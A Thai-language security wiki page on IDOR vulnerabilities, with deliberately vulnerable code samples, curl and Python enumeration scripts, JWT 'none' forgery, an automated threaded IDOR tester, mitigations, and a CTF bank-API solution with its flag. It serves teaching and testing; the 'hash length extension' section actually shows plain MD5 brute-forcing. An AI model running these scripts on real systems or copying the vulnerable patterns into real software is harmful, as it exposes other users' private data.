# IDOR (Insecure Direct Object Reference)

## What (อะไร)
IDOR (Insecure Direct Object Reference) เป็นช่องโหว่ประเภท Access Control ที่เกิดขึ้นเมื่อแอปพลิเคชันเปิดเผย reference ไปยัง object ภายใน (เช่น files, database records, URLs) โดยตรงต่อผู้ใช้ และไม่มีการตรวจสอบสิทธิ์การเข้าถึงอย่างเหมาะสม

ผู้โจมตีสามารถเปลี่ยนแปลง parameter เพื่อเข้าถึงข้อมูลของผู้ใช้คนอื่นหรือทรัพยากรที่ไม่ได้รับอนุญาต ช่องโหว่นี้เป็นหนึ่งในช่องโหว่ที่พบบ่อยที่สุดในการทดสอบความปลอดภัยของเว็บแอปพลิเคชัน

> [!warning] ความเสี่ยง
> IDOR เป็นส่วนหนึ่งของ Broken Access Control ซึ่งอยู่ในอันดับ 1 ของ OWASP Top 10 2021 เนื่องจากพบบ่อยและส่งผลกระทบรุนแรง

## Landmark (จุดสังเกต)
การระบุช่องโหว่ IDOR:

1. **Sequential IDs**: URL หรือ API ที่ใช้ ID แบบต่อเนื่อง เช่น `/user/1`, `/order/2`
2. **Predictable Identifiers**: ใช้ identifier ที่เดาได้ง่าย เช่น username, email, numeric IDs
3. **Direct File Access**: URLs ที่ชี้ไปยังไฟล์โดยตรง เช่น `/download?file=invoice_123.pdf`
4. **UUID/GUID Exposure**: แม้จะใช้ UUID แต่ถ้าไม่มีการตรวจสอบสิทธิ์ก็ยังมีช่องโหว่
5. **API Endpoints**: REST APIs ที่รับ resource IDs เช่น `/api/users/{id}`, `/api/posts/{id}`

> [!info] จุดที่มักพบ IDOR
> - Profile pages: `/profile?user_id=123`
> - Document downloads: `/download?doc=456`
> - API endpoints: `/api/order/789`
> - Image/File URLs: `/uploads/user_123/photo.jpg`
> - Invoice/Receipt access: `/invoice/INV-2024-001`

## Types (ประเภท)

### 1. Numeric Sequential IDOR
ใช้ตัวเลขต่อเนื่องเป็น identifier

```python
# โค้ดที่มีช่องโหว่ - ไม่มีการตรวจสอบ ownership
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/user/<int:user_id>')
def get_user(user_id):
    # ดึงข้อมูล user โดยไม่ตรวจสอบว่า logged-in user มีสิทธิ์เข้าถึงหรือไม่
    user = db.query("SELECT * FROM users WHERE id = ?", [user_id])
    
    # ส่งข้อมูลกลับโดยไม่มีการตรวจสอบ authorization
    return jsonify(user)

# Vulnerable: /api/user/1, /api/user/2, /api/user/3 ...
```

### 2. String-Based IDOR
ใช้ string เป็น identifier

```php
<?php
// โค้ดที่มีช่องโหว่ - username-based IDOR
session_start();

// รับ username จาก parameter
$username = $_GET['username'];

// ดึงข้อมูลโดยไม่ตรวจสอบว่าเป็น user คนเดียวกับที่ login หรือไม่
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);
$user_data = mysqli_fetch_assoc($result);

// แสดงข้อมูลส่วนตัว
echo "Email: " . $user_data['email'];
echo "Phone: " . $user_data['phone'];
echo "Address: " . $user_data['address'];

// Vulnerable: /profile.php?username=admin
?>
```

### 3. UUID/GUID IDOR
แม้ใช้ UUID แต่ไม่มีการตรวจสอบสิทธิ์

```javascript
// โค้ดที่มีช่องโหว่ - UUID ไม่ได้ป้องกัน IDOR
const express = require('express');
const app = express();

app.get('/api/document/:uuid', async (req, res) => {
    const documentId = req.params.uuid;
    
    // ดึง document ด้วย UUID
    const document = await db.documents.findOne({ 
        uuid: documentId 
    });
    
    // ส่งกลับโดยไม่ตรวจสอบว่า user มีสิทธิ์หรือไม่
    res.json(document);
});

// Vulnerable: /api/document/550e8400-e29b-41d4-a716-446655440000
// แม้จะเป็น UUID แต่ถ้ารู้ UUID ของคนอื่นก็เข้าถึงได้
```

### 4. File Path IDOR
การเข้าถึงไฟล์โดยตรง

```python
# โค้ดที่มีช่องโหว่ - Direct file access
from flask import Flask, send_file, request
import os

app = Flask(__name__)

@app.route('/download')
def download_file():
    # รับชื่อไฟล์จาก parameter
    filename = request.args.get('file')
    
    # สร้าง path และส่งไฟล์โดยไม่ตรวจสอบ ownership
    file_path = os.path.join('/uploads', filename)
    return send_file(file_path)

# Vulnerable: /download?file=user123_invoice.pdf
# Attacker: /download?file=user456_invoice.pdf
```

### 5. Body Parameter IDOR
IDOR ใน POST/PUT request body

```javascript
// โค้ดที่มีช่องโหว่ - Body parameter IDOR
app.put('/api/user/update', async (req, res) => {
    // รับ user_id จาก request body
    const userId = req.body.user_id;
    const newEmail = req.body.email;
    
    // Update ข้อมูลโดยไม่ตรวจสอบว่าเป็น user คนเดียวกัน
    await db.users.update(
        { id: userId },
        { email: newEmail }
    );
    
    res.json({ success: true });
});

// Vulnerable request:
// POST /api/user/update
// {"user_id": 999, "email": "hacker@evil.com"}
```

## Exploitation (การโจมตี)

### Basic IDOR Testing

```bash
# ทดสอบ IDOR แบบพื้นฐาน
# 1. Login เป็น user ธรรมดา
curl -c cookies.txt -d "username=user1&password=pass1" http://target.com/login

# 2. เข้าถึง profile ของตัวเอง
curl -b cookies.txt http://target.com/profile?id=100
# Response: {"name": "User1", "email": "user1@example.com"}

# 3. ลองเปลี่ยน ID เป็นของคนอื่น
curl -b cookies.txt http://target.com/profile?id=101
# ถ้าได้ข้อมูลของคนอื่น = มีช่องโหว่ IDOR!
```

### Sequential ID Enumeration

```python
# Script สำหรับ enumerate users ผ่าน IDOR
import requests

base_url = "http://target.com/api/user/"
session = requests.Session()

# Login
session.post("http://target.com/login", 
             data={"username": "user1", "password": "pass1"})

# Enumerate user IDs
valid_users = []
for user_id in range(1, 1000):
    url = f"{base_url}{user_id}"
    response = session.get(url)
    
    # ตรวจสอบว่าได้ข้อมูลหรือไม่
    if response.status_code == 200:
        user_data = response.json()
        print(f"[+] Found user {user_id}: {user_data['username']}")
        valid_users.append(user_data)
    elif response.status_code == 403:
        print(f"[-] User {user_id}: Forbidden")
    elif response.status_code == 404:
        print(f"[-] User {user_id}: Not found")

print(f"\n[*] Total valid users found: {len(valid_users)}")
```

### Parameter Tampering

```bash
# ทดสอบ parameter ต่างๆ
# URL parameters
curl "http://target.com/invoice?id=123"
curl "http://target.com/invoice?invoice_id=123"
curl "http://target.com/invoice?doc=123"

# POST body parameters
curl -X POST http://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"user_id": 456, "action": "delete"}'

# Headers
curl -H "X-User-ID: 789" http://target.com/api/profile

# Cookies
curl -b "user_id=999" http://target.com/dashboard
```

### Mass Assignment IDOR

```bash
# ทดสอบ mass assignment ร่วมกับ IDOR
# Request ปกติ
curl -X PUT http://target.com/api/profile \
  -H "Content-Type: application/json" \
  -d '{"email": "newemail@example.com"}'

# ลองเพิ่ม user_id parameter
curl -X PUT http://target.com/api/profile \
  -H "Content-Type: application/json" \
  -d '{"user_id": 999, "email": "hacker@evil.com"}'

# ลองเพิ่ม is_admin parameter
curl -X PUT http://target.com/api/profile \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1, "is_admin": true}'
```

### Burp Suite Intruder for IDOR

```bash
# ใช้ Burp Intruder เพื่อ automate IDOR testing
# 1. Intercept request ที่มี ID parameter
# 2. ส่งไป Intruder (Ctrl+I)
# 3. Mark ID parameter เป็น payload position
#    GET /api/user/§100§ HTTP/1.1
# 4. เลือก Payload type: Numbers
#    - From: 1
#    - To: 10000
#    - Step: 1
# 5. Start attack และดูผลลัพธ์
#    - Status code 200 = มีช่องโหว่
#    - Status code 403 = มีการ check authorization
#    - Status code 404 = ไม่มี resource
```

### Blind IDOR Detection

```python
# ทดสอบ Blind IDOR - ไม่เห็น response แต่มี side effect
import requests
import time

# ทดสอบ password reset IDOR
def test_password_reset_idor(target_email):
    session = requests.Session()
    
    # Login as attacker
    session.post("http://target.com/login",
                data={"username": "attacker", "password": "pass"})
    
    # ส่ง password reset request สำหรับเหยื่อ
    response = session.post("http://target.com/reset-password",
                           data={"email": target_email})
    
    # ตรวจสอบว่ามี email ส่งไปหรือไม่
    print(f"Testing: {target_email}")
    print(f"Response: {response.status_code}")
    
    # ถ้า status 200 แปลว่าอาจมีช่องโหว่
    if response.status_code == 200:
        print("[!] Possible IDOR - password reset sent!")

# Test
test_password_reset_idor("victim@example.com")
```

### IDOR in GraphQL

```python
# ทดสอบ IDOR ใน GraphQL API
import requests

graphql_url = "http://target.com/graphql"

# Query สำหรับดึงข้อมูล user
query = """
query {
  user(id: 123) {
    id
    username
    email
    ssn
    creditCard
  }
}
"""

# ทดสอบ IDOR โดยเปลี่ยน ID
for user_id in range(1, 100):
    modified_query = query.replace("123", str(user_id))
    
    response = requests.post(graphql_url,
                            json={"query": modified_query})
    
    if response.status_code == 200:
        data = response.json()
        if "errors" not in data:
            print(f"[+] User {user_id}: {data}")
```

## Advanced Techniques (เทคนิคขั้นสูง)

### Hash Length Extension Attack
```python
# ถ้า app ใช้ hash เพื่อ protect ID แต่ไม่ปลอดภัย
import hashlib

# สมมติว่า app ใช้ MD5(user_id) เป็น token
def generate_token(user_id):
    return hashlib.md5(str(user_id).encode()).hexdigest()

# Brute force tokens สำหรับ user IDs
for user_id in range(1, 1000):
    token = generate_token(user_id)
    print(f"User {user_id}: {token}")
    # ใช้ token นี้เพื่อเข้าถึงข้อมูล
```

### JWT IDOR
```python
# ทดสอบ IDOR ใน JWT tokens
import jwt
import json

# Decode JWT (ไม่ต้องรู้ secret)
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjN9.xxxxx"
decoded = jwt.decode(token, options={"verify_signature": False})

print("Original:", decoded)
# {'user_id': 123}

# เปลี่ยน user_id
decoded['user_id'] = 456

# Encode กลับ (ต้องรู้ secret หรือใช้ช่องโหว่อื่น)
# แต่ถ้า app ไม่ verify signature ก็สามารถใช้งานได้
new_token = jwt.encode(decoded, key='', algorithm='none')
```

### Wildcard/Regex Bypass
```bash
# บาง API ใช้ wildcard หรือ regex ที่ bypass ได้
# ปกติ
GET /api/user/123

# ลอง bypass ด้วย wildcard
GET /api/user/*
GET /api/user/%
GET /api/user/.*

# Path traversal
GET /api/user/../admin
GET /api/user/123/../456
```

## Tools (เครื่องมือ)

### Burp Suite Extensions
```bash
# Extensions ที่มีประโยชน์
# - Autorize: ทดสอบ authorization อotomatically
# - AuthMatrix: Matrix testing สำหรับ access control
# - Param Miner: ค้นหา hidden parameters
```

### Custom Python Script
```python
# Script สำหรับ automated IDOR testing
import requests
from concurrent.futures import ThreadPoolExecutor

class IDORTester:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
    
    def test_endpoint(self, endpoint, id_param, id_range):
        """ทดสอบ IDOR endpoint"""
        results = []
        
        def test_id(test_id):
            url = f"{self.base_url}{endpoint}"
            # แทนที่ parameter ด้วย ID ที่ทดสอบ
            url = url.replace(f"{{{id_param}}}", str(test_id))
            
            try:
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    return {
                        'id': test_id,
                        'status': 'VULNERABLE',
                        'data': response.text[:100]
                    }
                elif response.status_code == 403:
                    return {'id': test_id, 'status': 'PROTECTED'}
                else:
                    return {'id': test_id, 'status': 'NOT_FOUND'}
            except:
                return {'id': test_id, 'status': 'ERROR'}
        
        # ใช้ threading เพื่อความเร็ว
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = list(executor.map(test_id, id_range))
        
        return results
    
    def generate_report(self, results):
        """สร้าง report"""
        vulnerable = [r for r in results if r['status'] == 'VULNERABLE']
        protected = [r for r in results if r['status'] == 'PROTECTED']
        
        print(f"\n[*] IDOR Testing Report")
        print(f"[*] Total tested: {len(results)}")
        print(f"[!] Vulnerable: {len(vulnerable)}")
        print(f"[+] Protected: {len(protected)}")
        
        if vulnerable:
            print("\n[!] Vulnerable IDs:")
            for v in vulnerable[:10]:  # แสดง 10 อันแรก
                print(f"  - ID {v['id']}: {v['data']}")

# ใช้งาน
tester = IDORTester(
    base_url="http://target.com",
    session_cookie="your_session_cookie_here"
)

results = tester.test_endpoint(
    endpoint="/api/user/{id}",
    id_param="id",
    id_range=range(1, 1000)
)

tester.generate_report(results)
```

## Mitigation (การป้องกัน)

> [!tip] Best Practices
> 1. **Indirect Reference Maps**: ใช้ random tokens แทน direct IDs
> 2. **Authorization Checks**: ตรวจสอบสิทธิ์ทุก request
> 3. **Session-Based Access**: เก็บ context ใน session
> 4. **Per-User/Session Tokens**: ใช้ token ที่ unique ต่อ user
> 5. **Avoid Exposing IDs**: ไม่เปิดเผย internal IDs ใน URLs/APIs
> 6. **Use UUIDs**: ใช้ UUID แทน sequential IDs (แต่ต้องมี authz check ด้วย)
> 7. **Implement RBAC**: Role-Based Access Control

### Secure Implementation Example

```python
# โค้ดที่ปลอดภัย - มีการตรวจสอบ authorization
from flask import Flask, request, jsonify, session
from functools import wraps

app = Flask(__name__)

def require_auth(f):
    """Decorator สำหรับตรวจสอบ authentication"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated_function

def check_resource_ownership(resource_type, resource_id):
    """ตรวจสอบว่า user เป็นเจ้าของ resource หรือไม่"""
    current_user_id = session.get('user_id')
    
    # Query เพื่อตรวจสอบ ownership
    query = f"""
        SELECT user_id FROM {resource_type} 
        WHERE id = ? AND user_id = ?
    """
    result = db.query(query, [resource_id, current_user_id])
    
    return result is not None

@app.route('/api/user/<int:user_id>')
@require_auth
def get_user(user_id):
    current_user_id = session.get('user_id')
    
    # ตรวจสอบว่าเป็น user คนเดียวกันหรือเป็น admin
    if current_user_id != user_id and not is_admin(current_user_id):
        return jsonify({'error': 'Forbidden'}), 403
    
    # ดึงข้อมูล user
    user = db.query("SELECT * FROM users WHERE id = ?", [user_id])
    return jsonify(user)

@app.route('/api/document/<int:doc_id>')
@require_auth
def get_document(doc_id):
    # ตรวจสอบ ownership
    if not check_resource_ownership('documents', doc_id):
        return jsonify({'error': 'Forbidden'}), 403
    
    # ดึงข้อมูล document
    document = db.query("SELECT * FROM documents WHERE id = ?", [doc_id])
    return jsonify(document)
```

### Using Indirect Reference Map

```python
# ใช้ indirect reference map เพื่อหลีกเลี่ยง IDOR
import secrets
from flask import Flask, session

class SecureReferenceMap:
    def __init__(self):
        # เก็บ mapping ระหว่าง token กับ actual ID
        self.maps = {}
    
    def create_reference(self, user_id, resource_id):
        """สร้าง random token สำหรับ resource"""
        token = secrets.token_urlsafe(32)
        
        # เก็บ mapping โดย associate กับ user
        if user_id not in self.maps:
            self.maps[user_id] = {}
        
        self.maps[user_id][token] = resource_id
        return token
    
    def resolve_reference(self, user_id, token):
        """แปลง token กลับเป็น actual ID"""
        if user_id not in self.maps:
            return None
        
        return self.maps[user_id].get(token)

# ใช้งาน
ref_map = SecureReferenceMap()

@app.route('/api/documents')
def list_documents():
    user_id = session['user_id']
    
    # ดึง documents ของ user
    docs = db.query("SELECT * FROM documents WHERE user_id = ?", [user_id])
    
    # สร้าง tokens
    result = []
    for doc in docs:
        token = ref_map.create_reference(user_id, doc['id'])
        result.append({
            'token': token,  # ใช้ token แทน ID
            'title': doc['title']
        })
    
    return jsonify(result)

@app.route('/api/document/<token>')
def get_document(token):
    user_id = session['user_id']
    
    # แปลง token เป็น actual ID
    doc_id = ref_map.resolve_reference(user_id, token)
    
    if doc_id is None:
        return jsonify({'error': 'Not found'}), 404
    
    # ดึง document (already verified ownership ผ่าน reference map)
    document = db.query("SELECT * FROM documents WHERE id = ?", [doc_id])
    return jsonify(document)
```

## CTF Example: Bank API Challenge

**Challenge Description:**
```
SecureBank API - Easy (150 points)

We built a secure banking API with proper authentication!
Try to access other users' bank accounts.

URL: http://securebank.ctf.local
Credentials: user1 / password123
```

**Solution:**

1. **Login และสำรวจ API:**
```bash
# Login
curl -c cookies.txt -X POST http://securebank.ctf.local/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password123"}'

# ดู account ของตัวเอง
curl -b cookies.txt http://securebank.ctf.local/api/account/1
# {"account_id": 1, "username": "user1", "balance": 1000}
```

2. **ทดสอบ IDOR:**
```bash
# ลองเปลี่ยน account ID
curl -b cookies.txt http://securebank.ctf.local/api/account/2
# {"account_id": 2, "username": "admin", "balance": 999999}
# มีช่องโหว่ IDOR!
```

3. **Enumerate accounts:**
```python
# Script enumerate accounts
import requests

session = requests.Session()

# Login
session.post("http://securebank.ctf.local/api/login",
            json={"username": "user1", "password": "password123"})

# Enumerate
for account_id in range(1, 100):
    response = session.get(
        f"http://securebank.ctf.local/api/account/{account_id}"
    )
    
    if response.status_code == 200:
        account = response.json()
        print(f"Account {account_id}: {account['username']} - ${account['balance']}")
        
        # ค้นหา flag
        if 'flag' in account.get('notes', ''):
            print(f"[!] FLAG FOUND: {account['notes']}")
```

4. **ผลลัพธ์:**
```
Account 1: user1 - $1000
Account 2: admin - $999999
Account 3: user2 - $500
Account 10: flagholder - $0
[!] FLAG FOUND: CTF{1d0r_1n_b4nk1ng_4p1_15_b4d}
```

**Key Takeaways:**
- Authentication ไม่เท่ากับ Authorization
- แม้จะ login แล้ว ก็ยังต้องตรวจสอบว่า user มีสิทธิ์เข้าถึง resource นั้นหรือไม่
- ต้องมีการตรวจสอบ ownership ทุก request

## WikiLinks
- [[Web Application Security]]
- [[Access Control]]
- [[Authentication vs Authorization]]
- [[API Security]]
- [[OWASP Top 10]]
- [[Session Management]]
- [[Parameter Tampering]]

## Tags
#idor #access-control #api-security #authorization #broken-access-control #owasp #enumeration

---
**Last Updated:** 2026-06-16
